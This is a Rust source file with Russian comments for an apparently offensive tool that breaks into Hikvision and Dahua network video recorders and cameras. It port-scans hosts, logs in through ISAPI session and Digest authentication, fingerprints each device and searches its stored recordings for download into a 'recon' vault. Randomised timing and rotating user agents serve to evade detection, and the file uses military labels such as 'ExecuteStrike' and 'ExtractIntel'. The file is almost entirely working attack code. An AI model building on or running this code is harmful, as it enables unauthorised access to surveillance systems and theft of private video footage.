use tokio::sync::mpsc;
use std::time::{Duration, Instant};
use regex::Regex;
use chrono::Utc;
use digest_auth::AuthContext;
use sha2::{Sha256, Digest as ShaDigest};
use crate::inject_rtsp_credentials;

// =============================================================================
// 0. SAND ENGINE
// =============================================================================
struct SandRng { state: u64 }
impl SandRng {
    fn new() -> Self {
        let seed = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default().as_nanos() as u64;
        Self { state: seed ^ 0xDEAD_BEEF_CAFE_BABE }
    }
    fn next_u64(&mut self) -> u64 {
        let mut x = self.state; x ^= x << 13; x ^= x >> 7; x ^= x << 17;
        self.state = x; x
    }
    fn range(&mut self, lo: u64, hi: u64) -> u64 {
        if hi <= lo { lo } else { lo + (self.next_u64() % (hi - lo)) }
    }
    fn pick<'a, T>(&mut self, items: &'a [T]) -> &'a T {
        &items[self.range(0, items.len() as u64) as usize]
    }
}

#[derive(Clone)]
struct SandProfile {
    chunk_min: u64, chunk_max: u64,
    delay_min_ms: u64, delay_max_ms: u64,
    api_delay_min_ms: u64, api_delay_max_ms: u64,
    task_delay_min_ms: u64, task_delay_max_ms: u64,
}
impl SandProfile {
    fn standard() -> Self {
        Self { chunk_min: 512*1024, chunk_max: 2*1024*1024,
               delay_min_ms: 120, delay_max_ms: 600,
               api_delay_min_ms: 200, api_delay_max_ms: 800,
               task_delay_min_ms: 1500, task_delay_max_ms: 4000 }
    }
}

const IE_UA: &str = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)";
const UA_POOL: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
];
const ACCEPT_LANG_POOL: &[&str] = &["en-US,en;q=0.9","ru-RU,ru;q=0.9,en;q=0.8","en-GB,en;q=0.9"];

fn build_sand_client(rng: &mut SandRng, t: u64) -> Result<reqwest::Client, String> {
    reqwest::Client::builder().timeout(Duration::from_secs(t)).danger_accept_invalid_certs(true)
        .user_agent(*rng.pick(UA_POOL)).build().map_err(|e| e.to_string())
}
fn build_ie_client(t: u64) -> Result<reqwest::Client, String> {
    reqwest::Client::builder().timeout(Duration::from_secs(t)).danger_accept_invalid_certs(true)
        .user_agent(IE_UA).build().map_err(|e| e.to_string())
}
/// Cookie-jar клиент для session-based запросов
fn build_cookie_client(t: u64) -> Result<reqwest::Client, String> {
    reqwest::Client::builder().timeout(Duration::from_secs(t)).danger_accept_invalid_certs(true)
        .user_agent(IE_UA).cookie_store(true).build().map_err(|e| e.to_string())
}

fn apply_sand_headers(rng: &mut SandRng, req: reqwest::RequestBuilder) -> reqwest::RequestBuilder {
    req.header("Accept-Language", *rng.pick(ACCEPT_LANG_POOL))
       .header("Accept", "*/*").header("Cache-Control", "no-cache")
}
fn apply_ie_bootstrap(req: reqwest::RequestBuilder) -> reqwest::RequestBuilder {
    req.header("X-Requested-With", "XMLHttpRequest").header("User-Agent", IE_UA)
       .header("Accept", "application/xml, text/xml, */*").header("Connection", "keep-alive")
}
fn apply_ie_auth(req: reqwest::RequestBuilder) -> reqwest::RequestBuilder {
    req.header("X-Requested-With", "XMLHttpRequest").header("User-Agent", IE_UA)
       .header("Accept", "application/xml, text/xml, */*")
       .header("Connection", "keep-alive")
}
/// Версия с Guest-cookie — только для начального зондирования
fn apply_ie_auth_guest(req: reqwest::RequestBuilder) -> reqwest::RequestBuilder {
    req.header("X-Requested-With", "XMLHttpRequest").header("User-Agent", IE_UA)
       .header("Accept", "application/xml, text/xml, */*")
       .header("Cookie", "WebSession=Guest").header("Connection", "keep-alive")
}

async fn sand_sleep(rng: &mut SandRng, min_ms: u64, max_ms: u64, tx: &mpsc::Sender<HyperionEvent>, label: &str) {
    let ms = rng.range(min_ms, max_ms);
    let _ = tx.send(HyperionEvent::NexusLog { message: format!("⏳ [SAND] {} — {}ms", label, ms) }).await;
    tokio::time::sleep(Duration::from_millis(ms)).await;
}

// =============================================================================
// 1. SESSION LOGIN ENGINE (SHA-256 / Cookie-based — как современная веб-морда)
// =============================================================================

/// Генерирует 64-символьный hex session ID
fn generate_session_id(rng: &mut SandRng) -> String {
    let mut id = String::with_capacity(64);
    for _ in 0..64 { id.push_str(&format!("{:x}", rng.range(0, 16))); }
    id
}

/// SHA-256 hex hash
fn sha256_hex(input: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(input.as_bytes());
    format!("{:x}", hasher.finalize())
}

/// Боевая сессия Азгура: POST /ISAPI/Security/sessionLogin
/// Возвращает cookie-jar клиент с живой сессией.
///
/// Протокол v2 (исправленный — из реального трафика браузера):
/// 1. GET /ISAPI/Security/sessionLogin/capabilities → узнаём sessionID + алгоритм хеша
/// 2. POST /ISAPI/Security/sessionLogin с <SessionLogin xmlns="..."> (НЕ SessionLoginCap!)
///    password = SHA-256(userName + sessionID + SHA-256(password))  или SHA-256(password) — зависит от capabilities
/// 3. Камера отвечает 200 + Set-Cookie: WebSession_xxxxx=yyyyy
///
/// open_ports — список реально открытых портов (из scan_ports), чтобы не тратить время на таймауты
async fn azgura_session_login(
    host: &str, login: &str, pass: &str,
    tx: &mpsc::Sender<HyperionEvent>,
) -> Option<reqwest::Client> {
    azgura_session_login_with_ports(host, login, pass, None, tx).await
}

async fn azgura_session_login_with_ports(
    host: &str, login: &str, pass: &str,
    open_ports: Option<&[u16]>,
    tx: &mpsc::Sender<HyperionEvent>,
) -> Option<reqwest::Client> {
    let mut rng = SandRng::new();

    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🔑 [TOKEN] Запрос боевой сессии v2 (capabilities → login)..."),
    }).await;

    // Cookie-jar клиент — автоматически сохраняет Set-Cookie
    let client = match build_cookie_client(15) { Ok(c) => c, Err(_) => return None };

    // Определяем порты: если есть scan_ports — используем только открытые, иначе стандартные
    let default_ports = [2019u16, 80, 8080];
    let isapi_ports: Vec<u16> = match open_ports {
        Some(op) => default_ports.iter().copied().filter(|p| op.contains(p)).collect(),
        None => default_ports.to_vec(),
    };

    if isapi_ports.is_empty() {
        let _ = tx.send(HyperionEvent::NexusLog {
            message: "⚠️ [TOKEN] Нет открытых ISAPI-портов для sessionLogin".into(),
        }).await;
        return None;
    }

    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🔑 [TOKEN] Порты для sessionLogin: {:?}", isapi_ports),
    }).await;

    for port in &isapi_ports {
        // === ШАГ 1: GET capabilities — узнаём challenge (sessionID) и алгоритм ===
        let cap_url = format!("http://{}:{}/ISAPI/Security/sessionLogin/capabilities", host, port);
        let _ = tx.send(HyperionEvent::NexusLog {
            message: format!("🔑 [TOKEN] GET capabilities :{}", port),
        }).await;

        let cap_resp = client.get(&cap_url)
            .header("X-Requested-With", "XMLHttpRequest")
            .header("User-Agent", IE_UA)
            .header("Accept", "application/xml, text/xml, */*")
            .header("Connection", "keep-alive")
            .send().await;

        let (server_session_id, is_irreversible) = match cap_resp {
            Ok(r) => {
                let status = r.status().as_u16();
                let body = r.text().await.unwrap_or_default();
                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!("🔑 [TOKEN] capabilities :{} → HTTP {} | {}", port, status, body.chars().take(300).collect::<String>()),
                }).await;

                if status == 200 {
                    // Извлекаем sessionID из capabilities ответа
                    let sid = extract_xml_value(&body, "sessionID")
                        .or_else(|| extract_xml_value(&body, "challenge"));
                    // Проверяем isIrreversible — если true, камера ожидает SHA-256(user+sid+SHA-256(pass))
                    let irreversible = body.contains("<isIrreversible>true</isIrreversible>")
                        || body.contains("isIrreversible>true<");
                    let _ = tx.send(HyperionEvent::NexusLog {
                        message: format!("🔑 [TOKEN] :{} sessionID={} irreversible={}", port,
                            sid.as_deref().unwrap_or("(none)").chars().take(16).collect::<String>(), irreversible),
                    }).await;
                    (sid, irreversible)
                } else {
                    (None, false)
                }
            }
            Err(e) => {
                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!("🔑 [TOKEN] capabilities :{} → ОШИБКА: {}", port, e),
                }).await;
                (None, false)
            }
        };

        // === ШАГ 2: POST sessionLogin с правильным XML ===
        let session_id = server_session_id.unwrap_or_else(|| generate_session_id(&mut rng));

        // Вычисляем пароль по алгоритму камеры:
        // isIrreversible=true → SHA-256(userName + sessionID + SHA-256(password))
        // isIrreversible=false → SHA-256(password)
        let pass_encoded = if is_irreversible {
            let inner = sha256_hex(pass);
            sha256_hex(&format!("{}{}{}", login, session_id, inner))
        } else {
            sha256_hex(pass)
        };

        let login_url = format!("http://{}:{}/ISAPI/Security/sessionLogin", host, port);
        // ИСПРАВЛЕНО: <SessionLogin> (НЕ <SessionLoginCap>!) + обязательный xmlns
        let body = format!(
            r#"<?xml version="1.0" encoding="UTF-8"?><SessionLogin xmlns="http://www.hikvision.com/ver20/XMLSchema"><sessionID>{}</sessionID><userName>{}</userName><password>{}</password><isSessionIDValidLongTerm>false</isSessionIDValidLongTerm><sessionIDVersion>2</sessionIDVersion></SessionLogin>"#,
            session_id, login, pass_encoded
        );

        let _ = tx.send(HyperionEvent::NexusLog {
            message: format!("🔑 [TOKEN] POST sessionLogin :{} (irreversible={})", port, is_irreversible),
        }).await;

        let resp = client.post(&login_url)
            .header("Content-Type", "application/xml; charset=UTF-8")
            .header("X-Requested-With", "XMLHttpRequest")
            .header("User-Agent", IE_UA)
            .header("Accept", "application/xml, text/xml, */*")
            .header("Connection", "keep-alive")
            .body(body)
            .send().await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                let cookies: Vec<String> = r.cookies().map(|c| format!("{}={}", c.name(), c.value())).collect();
                let body = r.text().await.unwrap_or_default();

                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!("🔑 [TOKEN] :{} → HTTP {} | cookies: {:?} | body: {}",
                        port, status, cookies, body.chars().take(200).collect::<String>()),
                }).await;

                if status == 200 && (body.contains("<statusValue>200</statusValue>")
                    || body.contains("<statusString>OK</statusString>")
                    || !cookies.is_empty())
                {
                    let _ = tx.send(HyperionEvent::NexusLog {
                        message: format!("🔑 [TOKEN] ✅ СЕССИЯ ПОЛУЧЕНА на порту {}! Cookies: {:?}", port, cookies),
                    }).await;
                    return Some(client);
                }

                // Если 401 — попробуем userCheck для Digest challenge
                if status == 401 || status == 400 {
                    let _ = tx.send(HyperionEvent::NexusLog {
                        message: format!("🔑 [TOKEN] :{} sessionLogin вернул {} — пробуем userCheck", port, status),
                    }).await;
                    if let Some(c) = try_user_check_session(host, *port, login, pass, tx).await {
                        return Some(c);
                    }
                }
            }
            Err(e) => {
                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!("🔑 [TOKEN] :{} → ОШИБКА: {}", port, e),
                }).await;
            }
        }
    }

    let _ = tx.send(HyperionEvent::NexusLog {
        message: "⚠️ [TOKEN] Сессия не получена, фолбэк на Digest".into(),
    }).await;
    None
}

/// Альтернативный путь: GET /ISAPI/Security/userCheck для получения Digest challenge,
/// затем повторный GET с Authorization. Некоторые камеры на порту 2019 требуют именно это.
/// Возвращает cookie-jar клиент. Если cookie не установлена камерой —
/// сохраняем Digest credentials для повторного использования (realm/nonce/opaque).
async fn try_user_check_session(
    host: &str, port: u16, login: &str, pass: &str,
    tx: &mpsc::Sender<HyperionEvent>,
) -> Option<reqwest::Client> {
    let client = build_cookie_client(15).ok()?;
    let check_url = format!("http://{}:{}/ISAPI/Security/userCheck", host, port);

    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🔑 [TOKEN] GET userCheck :{}", port),
    }).await;

    let resp = client.get(&check_url)
        .header("X-Requested-With", "XMLHttpRequest")
        .header("User-Agent", IE_UA)
        .header("Accept", "application/xml, text/xml, */*")
        .send().await.ok()?;

    let status = resp.status().as_u16();
    let auth_header = resp.headers().get(reqwest::header::WWW_AUTHENTICATE)
        .and_then(|h| h.to_str().ok()).map(|s| s.to_string());

    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🔑 [TOKEN] userCheck :{} → HTTP {} | WWW-Auth: {}",
            port, status, auth_header.as_deref().unwrap_or("(none)")),
    }).await;

    let _ = resp.text().await; // consume body

    if status == 401 {
        if let Some(ah) = auth_header {
            let path = "/ISAPI/Security/userCheck";
            let mut prompt = digest_auth::parse(&ah).ok()?;
            let ctx = AuthContext::new(login.to_string(), pass.to_string(), path);
            let answer = prompt.respond(&ctx).ok()?;

            let resp2 = client.get(&check_url)
                .header("Authorization", answer.to_string())
                .header("X-Requested-With", "XMLHttpRequest")
                .header("User-Agent", IE_UA)
                .header("Accept", "application/xml, text/xml, */*")
                .send().await.ok()?;

            let status2 = resp2.status().as_u16();
            let cookies: Vec<String> = resp2.cookies().map(|c| format!("{}={}", c.name(), c.value())).collect();
            let body = resp2.text().await.unwrap_or_default();

            let _ = tx.send(HyperionEvent::NexusLog {
                message: format!("🔑 [TOKEN] userCheck+Digest :{} → HTTP {} | cookies: {:?} | body: {}",
                    port, status2, cookies, body.chars().take(120).collect::<String>()),
            }).await;

            if status2 == 200 {
                if !cookies.is_empty() {
                    let _ = tx.send(HyperionEvent::NexusLog {
                        message: format!("🔑 [TOKEN] ✅ СЕССИЯ (userCheck+Digest+Cookie) на порту {}!", port),
                    }).await;
                    return Some(client);
                }
                // Камера подтвердила кредсы (200 OK) но НЕ дала cookie.
                // Значит она работает ТОЛЬКО через Digest auth на каждый запрос.
                // Возвращаем None — search_isapi будет использовать Digest fallback.
                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!("⚠️ [TOKEN] userCheck OK но cookies=[] — камера без сессий, будем использовать Digest на каждый запрос"),
                }).await;
                return None;
            }
        }
    }
    None
}

// =============================================================================
// 2. DIGEST AUTH (fallback для камер без sessionLogin)
// =============================================================================

async fn digest_request(
    client: &reqwest::Client, method: reqwest::Method,
    url: &str, path: &str, login: &str, pass: &str,
    body: Option<String>, _tx: &mpsc::Sender<HyperionEvent>,
) -> Result<reqwest::Response, String> {
    let is_2019 = url.contains(":2019");
    let bootstrap = if is_2019 {
        // Для порта 2019: IE-style bootstrap, но с Content-Type и body для POST
        let mut req = apply_ie_bootstrap(client.request(method.clone(), url));
        if let Some(ref p) = body { req = req.header("Content-Type", "application/xml; charset=UTF-8").body(p.clone()); }
        req.send().await.map_err(|e| format!("Bootstrap 2019: {}", e))?
    } else {
        let mut req = client.request(method.clone(), url).basic_auth(login, Some(pass));
        if let Some(ref p) = body { req = req.header("Content-Type", "application/xml; charset=UTF-8").body(p.clone()); }
        req.send().await.map_err(|e| format!("Bootstrap std: {}", e))?
    };
    let status = bootstrap.status().as_u16();
    if status != 401 { return Ok(bootstrap); }

    let auth_header = bootstrap.headers().get(reqwest::header::WWW_AUTHENTICATE)
        .and_then(|h| h.to_str().ok()).map(|s| s.to_string());
    let _ = bootstrap.text().await;

    let _ = _tx.send(HyperionEvent::NexusLog {
        message: format!("🔐 [DIGEST] {} → WWW-Auth: {}", url, auth_header.as_deref().unwrap_or("(none)")),
    }).await;

    let auth_header = auth_header.ok_or_else(|| format!("401 без WWW-Authenticate на {}", url))?;

    let mut prompt = digest_auth::parse(&auth_header).map_err(|e| format!("Digest parse: {:?}", e))?;
    // Создаём контекст с правильным HTTP методом
    let mut ctx = AuthContext::new(login.to_string(), pass.to_string(), path);
    if method == reqwest::Method::POST {
        ctx.method = digest_auth::HttpMethod::POST;
        if let Some(ref b) = body { ctx.body = Some(b.as_bytes().into()); }
    }
    let answer = prompt.respond(&ctx).map_err(|e| format!("Digest respond: {:?}", e))?;

    let mut req = apply_ie_auth(client.request(method, url).header("Authorization", answer.to_string()));
    if let Some(p) = body { req = req.header("Content-Type", "application/xml; charset=UTF-8").body(p); }

    let resp = req.send().await.map_err(|e| format!("Digest final: {}", e))?;
    let _ = _tx.send(HyperionEvent::NexusLog {
        message: format!("🔐 [DIGEST] {} → final HTTP {}", url, resp.status().as_u16()),
    }).await;
    Ok(resp)
}

async fn digest_download_request(
    client: &reqwest::Client, url: &str, path: &str,
    login: &str, pass: &str, extra: Vec<(&str, String)>,
    _tx: &mpsc::Sender<HyperionEvent>,
) -> Result<reqwest::Response, String> {
    let is_2019 = url.contains(":2019");
    let bootstrap = if is_2019 {
        let mut r = apply_ie_bootstrap(client.get(url));
        for (k,v) in &extra { r = r.header(*k, v); }
        r.send().await.map_err(|e| format!("DL boot 2019: {}", e))?
    } else {
        let mut r = client.get(url).basic_auth(login, Some(pass));
        for (k,v) in &extra { r = r.header(*k, v); }
        r.send().await.map_err(|e| format!("DL boot std: {}", e))?
    };
    if bootstrap.status().as_u16() != 401 { return Ok(bootstrap); }

    let ah = bootstrap.headers().get(reqwest::header::WWW_AUTHENTICATE)
        .and_then(|h| h.to_str().ok()).map(|s| s.to_string());
    let _ = bootstrap.text().await;
    let ah = ah.ok_or("DL: 401 без WWW-Authenticate")?;

    let mut prompt = digest_auth::parse(&ah).map_err(|e| format!("DL parse: {:?}", e))?;
    let ctx = AuthContext::new(login.to_string(), pass.to_string(), path);
    let answer = prompt.respond(&ctx).map_err(|e| format!("DL respond: {:?}", e))?;

    let mut r = apply_ie_auth(client.get(url).header("Authorization", answer.to_string()));
    for (k,v) in &extra { r = r.header(*k, v); }
    r.send().await.map_err(|e| format!("DL final: {}", e))
}

// =============================================================================
// 3. ПРОТОКОЛ СВЯЗИ
// =============================================================================
#[derive(Debug, Clone)]
pub enum HyperionEvent {
    TargetDiscovered { ip: String, port: u16, login: String, pass: String },
    AnalyzeTarget { ip: String, port: u16, login: String, pass: String },
    TargetAnalyzed {
        ip: String, port: u16, login: String, pass: String,
        vendor: NvrVendor, open_ports: Vec<u16>,
        isapi_endpoint: Option<String>, onvif_endpoint: Option<String>,
        device_model: Option<String>, camera_time_offset: Option<i32>,
    },
    ExecuteStrike {
        ip: String, port: u16, login: String, pass: String,
        vendor: NvrVendor,
        isapi_endpoint: Option<String>, onvif_endpoint: Option<String>,
        camera_time_offset: Option<i32>,
        open_ports: Vec<u16>,
    },
    ExtractIntel {
        ip: String, login: String, pass: String, vendor: NvrVendor,
        isapi_recordings: Vec<IsapiHit>, onvif_recordings: Vec<OnvifHit>,
    },
    TransportCargo { ip: String, login: String, pass: String, download_tasks: Vec<DownloadTask> },
    OperationComplete { ip: String, result: String },
    OperationFailed { ip: String, reason: String },
    NexusLog { message: String },
}

#[derive(Debug, Clone, PartialEq)]
pub enum NvrVendor { Hikvision, Dahua, Unknown }
impl std::fmt::Display for NvrVendor {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self { NvrVendor::Hikvision => write!(f,"Hikvision"), NvrVendor::Dahua => write!(f,"Dahua"), NvrVendor::Unknown => write!(f,"Unknown") }
    }
}

#[derive(Debug, Clone)]
pub struct IsapiHit { pub endpoint: String, pub track_id: Option<String>, pub start_time: Option<String>, pub end_time: Option<String>, pub playback_uri: Option<String> }
#[derive(Debug, Clone)]
pub struct OnvifHit { pub endpoint: String, pub token: String }
#[derive(Debug, Clone)]
pub enum DownloadTask {
    IsapiPlayback { playback_uri: String, login: String, pass: String, filename_hint: String },
    OnvifToken { endpoint: String, recording_token: String, login: String, pass: String, filename_hint: String },
    RtspCapture { source_url: String, filename_hint: String, duration_seconds: u64 },
}

// =============================================================================
// 4. UTILITY
// =============================================================================
fn normalize_host(input: &str) -> String {
    input.trim().trim_start_matches("http://").trim_start_matches("https://").trim_start_matches("rtsp://")
        .split('/').next().unwrap_or_default().split(':').next().unwrap_or_default().to_string()
}
fn get_vault_path() -> std::path::PathBuf {
    let p = if cfg!(target_os = "windows") {
        std::path::PathBuf::from(r"D:\Nemesis_Vault\recon_db")
    } else {
        std::env::var("HOME")
            .map(std::path::PathBuf::from)
            .unwrap_or_else(|_| std::path::PathBuf::from("."))
            .join(".nemesis_vault")
            .join("recon_db")
    };
    if !p.exists() { let _ = std::fs::create_dir_all(&p); }
    p
}
fn get_ffmpeg_path() -> std::path::PathBuf {
    let bundled = get_vault_path().join(if cfg!(target_os = "windows") { "ffmpeg.exe" } else { "ffmpeg" });
    if bundled.exists() {
        bundled
    } else if cfg!(target_os = "windows") {
        std::path::PathBuf::from("ffmpeg.exe")
    } else {
        std::path::PathBuf::from("ffmpeg")
    }
}
fn sanitize_filename(input: &str) -> String {
    let mut o = String::with_capacity(input.len());
    for ch in input.chars() { if ch.is_ascii_alphanumeric() || ch == '.' || ch == '_' || ch == '-' { o.push(ch); } else { o.push('_'); } }
    let t = o.trim_matches('_'); if t.is_empty() { "recording".into() } else { t.to_string() }
}
fn extract_xml_value(xml: &str, tag: &str) -> Option<String> {
    Regex::new(&format!("<{}[^>]*>([^<]+)</{}>", tag, tag)).ok()
        .and_then(|re| re.captures(xml).and_then(|c| c.get(1).map(|m| m.as_str().trim().to_string())))
}
fn generate_search_xml(tid: &str, from: &str, to: &str) -> String {
    format!(r#"<?xml version="1.0" encoding="UTF-8"?>
<SearchDescription xmlns="http://www.hikvision.com/ver20/XMLSchema"><searchID>1</searchID><trackList><trackID>{}</trackID></trackList>
<timeSpanList><timeSpan><startTime>{}</startTime><endTime>{}</endTime></timeSpan></timeSpanList>
<maxResults>40</maxResults><searchResultPostion>0</searchResultPostion>
<metadataList><metadataDescriptor>//recordType.meta.std-cgi.com</metadataDescriptor></metadataList>
</SearchDescription>"#, tid, from, to)
}

/// Альтернативный XML без xmlns — для старых камер
fn generate_search_xml_plain(tid: &str, from: &str, to: &str) -> String {
    format!(r#"<?xml version="1.0" encoding="UTF-8"?>
<SearchDescription><searchID>1</searchID><trackList><trackID>{}</trackID></trackList>
<timeSpanList><timeSpan><startTime>{}</startTime><endTime>{}</endTime></timeSpan></timeSpanList>
<maxResults>40</maxResults><searchResultPostion>0</searchResultPostion>
<metadataList><metadataDescriptor>//recordType.meta.std-cgi.com</metadataDescriptor></metadataList>
</SearchDescription>"#, tid, from, to)
}

/// CMSearchDescription вариант — для некоторых NVR
fn generate_search_xml_cm(tid: &str, from: &str, to: &str) -> String {
    format!(r#"<?xml version="1.0" encoding="UTF-8"?>
<CMSearchDescription xmlns="http://www.hikvision.com/ver20/XMLSchema"><searchID>1</searchID><trackList><trackID>{}</trackID></trackList>
<timeSpanList><timeSpan><startTime>{}</startTime><endTime>{}</endTime></timeSpan></timeSpanList>
<maxResults>40</maxResults><searchResultPostion>0</searchResultPostion>
<metadataList><metadataDescriptor>//recordType.meta.std-cgi.com</metadataDescriptor></metadataList>
</CMSearchDescription>"#, tid, from, to)
}

fn generate_search_xml_cm_legacy(tid: &str, from: &str, to: &str) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<CMSearchDescription>
  <searchID>1</searchID>
  <trackList>
    <trackID>{}</trackID>
  </trackList>
  <timeSpanList>
    <timeSpan>
      <startTime>{}</startTime>
      <endTime>{}</endTime>
    </timeSpan>
  </timeSpanList>
  <maxResults>40</maxResults>
  <searchResultPostion>0</searchResultPostion>
  <metadataList>
    <metadataDescriptor>//recordType.meta.std-cgi.com</metadataDescriptor>
  </metadataList>
</CMSearchDescription>"#,
        tid, from, to
    )
}

fn url_to_path(url: &str) -> String {
    if let Some(idx) = url.find("://") { let rest = &url[idx+3..]; if let Some(s) = rest.find('/') { return rest[s..].to_string(); } }
    "/".to_string()
}

// =============================================================================
// 5. BRAIN OPS
// =============================================================================
async fn scan_ports(host: &str, _tx: &mpsc::Sender<HyperionEvent>) -> Vec<u16> {
    let ports = [21u16,22,80,443,554,2019,8080,8443];
    let mut open = Vec::new(); let mut rng = SandRng::new();
    for port in ports {
        let addr = format!("{}:{}", host, port);
        if tokio::time::timeout(Duration::from_millis(900), tokio::net::TcpStream::connect(&addr)).await.is_ok_and(|v| v.is_ok()) { open.push(port); }
        tokio::time::sleep(Duration::from_millis(rng.range(30,90))).await;
    }
    open
}

async fn probe_isapi(host: &str, login: &str, pass: &str, tx: &mpsc::Sender<HyperionEvent>) -> Option<String> {
    probe_isapi_with_ports(host, login, pass, None, tx).await
}

async fn probe_isapi_with_ports(host: &str, login: &str, pass: &str, open_ports: Option<&[u16]>, tx: &mpsc::Sender<HyperionEvent>) -> Option<String> {
    let mut rng = SandRng::new(); let sand = SandProfile::standard();
    let all_candidates = vec![
        (2019u16, format!("http://{}:2019/ISAPI/System/deviceInfo", host)),
        (80, format!("http://{}:80/ISAPI/System/deviceInfo", host)),
        (8080, format!("http://{}:8080/ISAPI/System/deviceInfo", host)),
        (443, format!("https://{}:443/ISAPI/System/deviceInfo", host)),
    ];
    // Фильтруем по открытым портам если известны
    let candidates: Vec<_> = match open_ports {
        Some(op) => all_candidates.into_iter().filter(|(p, _)| op.contains(p)).collect(),
        None => all_candidates,
    };
    for (_port, ep) in &candidates {
        let is_2019 = ep.contains(":2019");
        let client = if is_2019 { build_ie_client(15) } else { build_sand_client(&mut rng, 8) };
        let client = match client { Ok(c) => c, Err(_) => continue };
        let path = url_to_path(ep);
        let _ = tx.send(HyperionEvent::NexusLog { message: format!("🔍 [PROBE] ISAPI: {} ({})", ep, if is_2019 {"Digest"} else {"Basic"}) }).await;
        match digest_request(&client, reqwest::Method::GET, ep, &path, login, pass, None, tx).await {
            Ok(resp) => {
                let s = resp.status().as_u16();
                let _ = tx.send(HyperionEvent::NexusLog { message: format!("🔍 [PROBE] {} → HTTP {}", ep, s) }).await;
                if s == 200 || s == 401 || s == 403 {
                    let _ = tx.send(HyperionEvent::NexusLog { message: format!("🔓 [PROBE] ISAPI ОБНАРУЖЕН: {} (HTTP {})", ep, s) }).await;
                    return Some(ep.clone());
                }
            }
            Err(e) => { let _ = tx.send(HyperionEvent::NexusLog { message: format!("🔍 [PROBE] {} → {}", ep, e) }).await; }
        }
        sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "ISAPI probe").await;
    }
    None
}

async fn probe_onvif(host: &str, tx: &mpsc::Sender<HyperionEvent>) -> Option<String> {
    let mut rng = SandRng::new(); let sand = SandProfile::standard();
    for ep in &[
        format!("http://{}:80/onvif/device_service", host),
        format!("http://{}:8080/onvif/device_service", host),
        format!("http://{}:2019/onvif/device_service", host),
    ] {
        let is_2019 = ep.contains(":2019");
        let client = if is_2019 { build_ie_client(12) } else { build_sand_client(&mut rng, 8) };
        let client = match client { Ok(c) => c, Err(_) => continue };
        let mut req = client.get(ep.as_str());
        req = if is_2019 { apply_ie_bootstrap(req) } else { apply_sand_headers(&mut rng, req) };
        if let Ok(resp) = req.send().await {
            let s = resp.status().as_u16();
            if s == 200 || s == 401 || s == 403 || s == 405 { return Some(ep.clone()); }
        }
        sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "ONVIF probe").await;
    }
    None
}

async fn fetch_device_info(host: &str, login: &str, pass: &str, tx: &mpsc::Sender<HyperionEvent>) -> (NvrVendor, Option<String>, Option<i32>) {
    let mut rng = SandRng::new(); let sand = SandProfile::standard();
    for url in &[
        format!("http://{}:2019/ISAPI/System/deviceInfo", host),
        format!("http://{}:80/ISAPI/System/deviceInfo", host),
    ] {
        let client = if url.contains(":2019") { build_ie_client(15) } else { build_sand_client(&mut rng, 8) };
        let client = match client { Ok(c) => c, Err(_) => continue };
        if let Ok(resp) = digest_request(&client, reqwest::Method::GET, url, &url_to_path(url), login, pass, None, tx).await {
            if resp.status().is_success() {
                let text = resp.text().await.unwrap_or_default().to_lowercase();
                let model = extract_xml_value(&text, "model");
                let vendor = if text.contains("hikvision") || text.contains("isapi") { NvrVendor::Hikvision }
                    else if text.contains("dahua") { NvrVendor::Dahua } else { NvrVendor::Hikvision };
                let offset = check_camera_clock(host, login, pass, tx).await;
                return (vendor, model, offset);
            }
        }
        sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "deviceInfo").await;
    }
    (NvrVendor::Unknown, None, None)
}

async fn check_camera_clock(host: &str, login: &str, pass: &str, tx: &mpsc::Sender<HyperionEvent>) -> Option<i32> {
    for port in &[2019, 80] {
        let url = format!("http://{}:{}/ISAPI/System/time", host, port);
        let client = if *port == 2019 { build_ie_client(15).ok()? } else { build_sand_client(&mut SandRng::new(), 8).ok()? };
        if let Ok(resp) = digest_request(&client, reqwest::Method::GET, &url, "/ISAPI/System/time", login, pass, None, tx).await {
            if resp.status().is_success() {
                let body = resp.text().await.unwrap_or_default();
                let re = Regex::new(r"<(?:localTime|time)>([^<]+)</").ok()?;
                let val = re.captures(&body)?.get(1)?.as_str().trim();
                if val.len() >= 4 {
                    if let Ok(cam_year) = val[..4].parse::<i32>() {
                        let now_year = Utc::now().format("%Y").to_string().parse::<i32>().unwrap_or(2026);
                        let skew = now_year - cam_year;
                        let _ = tx.send(HyperionEvent::NexusLog { message: format!("🕒 [CLOCK] Камера: {} | skew={}y", val, skew) }).await;
                        return Some(skew);
                    }
                }
            }
        }
    }
    None
}

// =============================================================================
// 6. SPETSNAZ: ISAPI SEARCH (Session → Digest fallback)
// =============================================================================

/// Поиск записей. Пробует:
/// 1. Cookie-based (если session_client есть) — один прямой POST
/// 2. Digest auth (если cookie не сработал или нет сессии)
async fn search_isapi(
    host: &str, login: &str, pass: &str,
    clock_offset: Option<i32>,
    session_client: &Option<reqwest::Client>,
    tx: &mpsc::Sender<HyperionEvent>,
) -> Vec<IsapiHit> {
    search_isapi_with_ports(host, login, pass, clock_offset, session_client, None, tx).await
}

